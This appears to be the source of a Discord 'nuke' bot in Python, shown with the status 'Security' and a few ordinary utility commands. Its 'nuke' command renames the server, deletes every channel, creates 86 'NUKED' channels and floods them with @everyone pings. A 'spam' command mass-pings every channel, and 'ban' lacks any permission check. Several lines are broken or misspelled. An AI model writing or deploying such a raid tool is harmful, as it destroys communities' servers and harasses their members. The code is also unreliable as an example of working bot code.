import discord
from discord.ext import commands, tasks
import os
import asyncio
import os, time, random
from discord.ext import commands
import asyncio
import DiscordUtils
import discord.ext
bot = commands.Bot(indents=discord.Intents.all(), command_prefix="!")
client = commands.Bot(command_prefix="!", case_intensive=True, intents=discord.Intents.all())
client.remove_command('help')
import pytz
from datetime import datetime
from discord import Intents
from discord import Streaming
from discord.utils import get
from discord.ext import commands
prefix='!'
n=0

intents=discord.Intents.default()
intents = discord.Intents(messages=True, guilds=True)





client = commands.Bot(command_prefix=prefix, intents=intents)
@client.event
async def on_ready():
    print('Bot ist online')
    await client.change_presence(activity=discord.Game('Security'))

@client.command()
async def ping(ctx):
    await ctx.send(f'Pong! {round(client.latency * 1000)}ms')

@client.command
async def invite(ctx):
  await ctx.reply('')

@client.command()
async def nuke(ctx):

    await ctx.guild.edit(name='NUKED') #Decide what to change the server name to

    for c in ctx.guild.channels:
        await c.delete()

    guild = ctx.message.guild

    n=0
    while(n<=85):
        await guild.create_text_channel('NUKED!!!!!')
        n = n+1

    for c in ctx.guild.text_channels:
             await c.send('@everyone NUKED!') # Put the messages you want to be spammed here
             await c.send('@everyone NUKED!')
             await c.send('@everyone NUKED!')
             await c.send('@everyone NUKED!')
             await c.send('@everyone NUKED!')

@client.command()
async def spam(ctx):
    for c in ctx.guild.text_channels:
             await c.send('@everyone ') #Put what to be spammed in the brackets
             await c.send('@everyone ')
             await c.send('@everyone ')
             await c.send('@everyone ')
             await c.send('@everyone ')
             await c.send('@everyone ')
             await c.send('@everyone ')
             await c.send('@everyone ')
             await c.send('@everyone ')
             await c.send('@everyone ')
             await c.send('@everyone ')
             await c.send('@everyone ')
             await c.send('@everyone ')
             await c.send('@everyone ')
             await c.send('@everyone ')
             await c.send('@everyone ')
             await c.send('@everyone ')
             await c.send('@everyone ')
             await c.send('@everyone ')
             await c.send('@everyone ')
             await c.send('@everyone ')
             await c.send('@everyone ')
             await c.send('@everyone ')
             await c.send('@everyone ')
             await c.send('@everyone ')
             await c.send('@everyone ')
             await c.send('@everyone ')
             await c.send('@everyone ')
             await c.send('@everyone ')
             await c.send('@everyone ')
             await c.send('@everyone ')
             await c.send('@everyone ')
             await c.send('@everyone ')
#USERINFO
@client.command(name="userinfo")
async def userinfo(ctx, member: discord.Member):
    de = pytz.timezone("Europe/Berlin")
    embed=discord.Embed(Title=f" > Userinfo for {member.display_name}",
                        description="a simple userinfo!", color = 0x4cd137 , timestamp=datetime.now().astimezone(tz=de))

    embed.add_field(name= "Name", value=f"```{member.name}#{member.discriminator}```", inline=True)
    embed.add_field(name="Bot", value=f"```{('yes' if member.bot else 'no')}```", inline=True)
    embed.add_field(name="Nickname", value=f"```{member.nick if member.nick else 'No nickname'}```", inline=True)
    embed.add_field(name="Server joined", value=f"```{member.joined_at}```", inline=True)
    embed.add_field(name="Roles", value=f"```{len(member.roles)}```", inline=True)
    embed.add_field(name="color", value=f"```{member.color}```", inline=True)
    embed.add_field(name="Booster?", value=f"```{('yes!' if member.premium_since else 'No :(')}```")
    embed.set_footer(text="Made by Cyrus!", icon_url=ctx.author.avatar_url)
    message = await ctx.send(embed=embed)
    await message.add_reaction("👌")

@client.command()
@commands.has_permissions(manage_messages=True)
async def clear(ctx, amount=3):
    await ctx.channel.purge(limit=amount+1)
    embed = discord.Embed(
    description = f"i deleted {amount} messages!",
    color = 0x4cd137)

    await ctx.send(embed=embed)
    await asyncio.sleep(5)
    await ctx.channel.purge(limit=amount)

@client.command()
async def ban(ctx, member : discord.member, *, reason=None):
    await member.ban(reason=reason)

client.run('')
